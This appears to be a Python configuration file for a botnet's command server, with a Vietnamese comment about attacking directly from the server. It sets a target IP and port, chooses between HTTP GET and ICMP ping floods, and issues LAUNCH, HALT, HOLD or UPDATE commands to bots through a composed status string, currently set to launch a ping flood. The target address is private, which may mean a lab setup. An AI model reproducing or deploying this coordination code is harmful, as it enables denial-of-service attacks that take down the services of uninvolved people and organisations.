

#Có thể fix lại code để tấn công luôn từ máy chủ mà không cần cấu hình lại trên mỗi máy bot.
ATTACK_TARGET_HOST = "172.20.10.3" # IP address of the machine to be attacked.
ATTACK_TARGET_PORT = "80" # Port Number of the machine to be attacked.

#################################################################################

# Type of Attacks (Other Attacks are not yet supported)
	#HTTPFLOOD - Floods the target system with GET requests. (PORT and DELAY parameters required)
	#PINGFLOOD - Floods the target system with ICMP echo requests. (PORT AND DELAY parameters not required)

ATTACK_TYPE = "PINGFLOOD"

# Number of seconds delay between the burst of requests. 0 for No Delay
ATTACK_BURST_SECONDS = "0" 

#################################################################################

#Status codes that has to be set from the below list. 
	# HALT - To stop attacks immediately.
	# LAUNCH - To immediately start the attack.
	# HOLD - Wait for command.
	# UPDATE - Update Client.

ATTACK_CODE = "LAUNCH" # Choose any one Flag from above

#################################################################################


ATTACK_STATUS = ATTACK_TARGET_HOST + "_" + ATTACK_TARGET_PORT + "_" + ATTACK_CODE + "_" + ATTACK_TYPE + "_" + ATTACK_BURST_SECONDS
